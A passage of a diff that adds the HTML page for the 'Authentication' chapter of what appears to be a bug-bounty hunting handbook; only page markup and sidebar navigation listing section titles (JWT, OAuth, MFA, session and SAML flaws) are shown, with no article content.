@@ -1,0 +1,2807 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Authentication is the front door. Session management is the lock on every door inside. Bugs here lead directly to account takeover.">
+      
+      
+        <meta name="author" content="Wellington Vumu">
+      
+      
+      
+        <link rel="prev" href="../part-01-recon/">
+      
+      
+        <link rel="next" href="../part-03-access-control/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.39">
+    
+    
+      
+        <title>Authentication - Hunter's handbook</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../assets/stylesheets/modern/main.1e981d71.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#authentication" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-header__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hunter's handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Authentication
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-nav__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    Hunter's handbook
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="./.." class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-rocket" viewBox="0 0 24 24"><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09"/><path d="M9 12a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.4 22.4 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 .05 5 .05"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-01-recon/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-round-key" viewBox="0 0 24 24"><path d="M19 11v6M19 13h2M2 21a8 8 0 0 1 12.868-6.349"/><circle cx="10" cy="8" r="5"/><circle cx="19" cy="19" r="2"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-round-key" viewBox="0 0 24 24"><path d="M19 11v6M19 13h2M2 21a8 8 0 0 1 12.868-6.349"/><circle cx="10" cy="8" r="5"/><circle cx="19" cy="19" r="2"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.1 Authentication Bypass
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1 Authentication Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#211-login-logic-flaws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.1.1 Login Logic Flaws
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#212-default-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.1.2 Default Credentials
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#213-response-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.1.3 Response Manipulation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-password-reset-flaws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2 Password Reset Flaws
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.2 Password Reset Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#221-token-predictability" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2.1 Token Predictability
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#222-host-header-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2.2 Host Header Injection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#223-token-reuse-and-expiry" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2.3 Token Reuse and Expiry
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#224-username-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2.4 Username Enumeration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-jwt-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3 JWT Attacks
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.3 JWT Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#231-algorithm-confusion-rs256-hs256" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.1 Algorithm Confusion (RS256 → HS256)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#232-alg-none-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.2 <code>alg: none</code> Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#233-weak-secret-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.3 Weak Secret Brute-Force
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#234-kid-header-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.4 <code>kid</code> Header Injection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#235-claim-tampering" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.5 Claim Tampering
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#236-jwt-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.6 JWT Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24-oauth-20-flaws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4 OAuth 2.0 Flaws
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.4 OAuth 2.0 Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#241-redirect-uri-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.1 Redirect URI Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#242-state-parameter-bypass-csrf-ato" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.2 State Parameter Bypass (CSRF → ATO)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#243-authorization-code-interception" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.3 Authorization Code Interception
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#244-account-takeover-via-oauth-mislink" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.4 Account Takeover via OAuth Mislink
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#245-oauth-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.5 OAuth Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#25-multi-factor-authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5 Multi-Factor Authentication Bypass
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.5 Multi-Factor Authentication Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#251-otp-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5.1 OTP Brute-Force
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#252-response-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5.2 Response Manipulation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#253-mfa-skip-via-direct-navigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5.3 MFA Skip via Direct Navigation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#254-backup-code-and-recovery-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5.4 Backup Code and Recovery Abuse
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#26-session-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6 Session Management
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.6 Session Management">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#261-session-fixation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6.1 Session Fixation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#262-session-not-invalidated-on-logout" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6.2 Session Not Invalidated on Logout
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#263-cookie-security-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6.3 Cookie Security Flags
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#264-session-token-entropy" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6.4 Session Token Entropy
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#27-single-sign-on-sso--saml-flaws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.7 Single Sign-On (SSO) / SAML Flaws
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.7 Single Sign-On (SSO) &#x2f; SAML Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#271-xml-signature-wrapping-xsw" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.7.1 XML Signature Wrapping (XSW)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#272-signature-removal-and-replay" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.7.2 Signature Removal and Replay
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#273-audience-and-timestamp-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.7.3 Audience and Timestamp Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-2-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 2 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-03-access-control/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-lock" viewBox="0 0 24 24"><path d="M19 16v-2a2 2 0 0 0-4 0v2M9.5 15H7a4 4 0 0 0-4 4v2"/><circle cx="10" cy="7" r="4"/><rect width="8" height="5" x="13" y="16" rx=".899"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-04-injection/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-syringe" viewBox="0 0 24 24"><path d="m18 2 4 4M17 7l3-3M19 9 8.7 19.3c-1 1-2.5 1-3.4 0l-.6-.6c-1-1-1-2.5 0-3.4L15 5M9 11l4 4M5 19l-3 3M14 4l6 6"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-05-ssrf-xxe/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server" viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><path d="M6 6h.01M6 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF & XXE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-06-business-logic/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain" viewBox="0 0 24 24"><path d="M12 18V5M15 13a4.17 4.17 0 0 1-3-4 4.17 4.17 0 0 1-3 4M17.598 6.5A3 3 0 1 0 12 5a3 3 0 1 0-5.598 1.5"/><path d="M17.997 5.125a4 4 0 0 1 2.526 5.77"/><path d="M18 18a4 4 0 0 0 2-7.464"/><path d="M19.967 17.483A4 4 0 1 1 12 18a4 4 0 1 1-7.967-.517"/><path d="M6 18a4 4 0 0 1-2-7.464"/><path d="M6.003 5.125a4 4 0 0 0-2.526 5.77"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-07-api/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cog" viewBox="0 0 24 24"><path d="M11 10.27 7 3.34M11 13.73l-4 6.93M12 22v-2M12 2v2M14 12h8M17 20.66l-1-1.73M17 3.34l-1 1.73M2 12h2M20.66 17l-1.73-1M20.66 7l-1.73 1M3.34 17l1.73-1M3.34 7l1.73 1"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="12" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    API Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-08-ai-llm/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain-circuit" viewBox="0 0 24 24"><path d="M12 5a3 3 0 1 0-5.997.125 4 4 0 0 0-2.526 5.77 4 4 0 0 0 .556 6.588A4 4 0 1 0 12 18Z"/><path d="M9 13a4.5 4.5 0 0 0 3-4M6.003 5.125A3 3 0 0 0 6.401 6.5M3.477 10.896a4 4 0 0 1 .585-.396M6 18a4 4 0 0 1-1.967-.516M12 13h4M12 18h6a2 2 0 0 1 2 2v1M12 8h8M16 8V5a2 2 0 0 1 2-2"/><circle cx="16" cy="13" r=".5"/><circle cx="18" cy="3" r=".5"/><circle cx="20" cy="21" r=".5"/><circle cx="20" cy="8" r=".5"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    AI & LLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-09-cloud/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cloud" viewBox="0 0 24 24"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-10-mobile/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-smartphone" viewBox="0 0 24 24"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-11-reporting/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-notebook-pen" viewBox="0 0 24 24"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4M2 6h4M2 10h4M2 14h4M2 18h4"/><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reporting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-12-platform/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-layers" viewBox="0 0 24 24"><path d="M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z"/><path d="M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12"/><path d="M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Platform
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-13-tooling/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-wrench" viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.106-3.105c.32-.322.863-.22.983.218a6 6 0 0 1-8.259 7.057l-7.91 7.91a1 1 0 0 1-2.999-3l7.91-7.91a6 6 0 0 1 7.057-8.259c.438.12.54.662.219.984z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Tooling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-14-infrastructure/" class="md-nav__link">
+        
+  
+  
